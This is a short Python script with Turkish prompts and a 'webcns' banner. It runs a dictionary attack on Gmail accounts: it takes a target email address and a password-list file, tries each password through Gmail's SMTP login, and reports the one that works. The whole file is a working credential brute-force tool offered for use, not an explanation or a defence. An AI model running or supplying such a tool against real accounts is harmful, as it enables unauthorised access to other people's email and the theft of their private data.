import os
os.system('clear')
import time
import smtplib

print("""
              _
             | |
__      _____| |__   ___ _ __  ___
\ \ /\ / / _ \ '_ \ / __| '_ \/ __|
 \ V  V /  __/ |_) | (__| | | \__ \
  \_/\_/ \___|_.__/ \___|_| |_|___/
""")


Yasser = smtplib.SMTP_SSL("smtp.gmail.com",465)
Yasser.ehlo()
email = input ("\033[1;35m Email Adresinizi Girin  : ")
passfile = input ("\033[1;35m Dosya Yolu : ")
passfile = open (passfile ,"r")
for password in passfile:
    try:
        time.sleep(2)
        Yasser.login(email, password)
        print("\033[1;32m Parola Bulundu ==> " ,password)
        break
    except smtplib.SMTPAuthenticationError:
        print("\033[1;31m Parola Bulunamadi ==> " ,password)
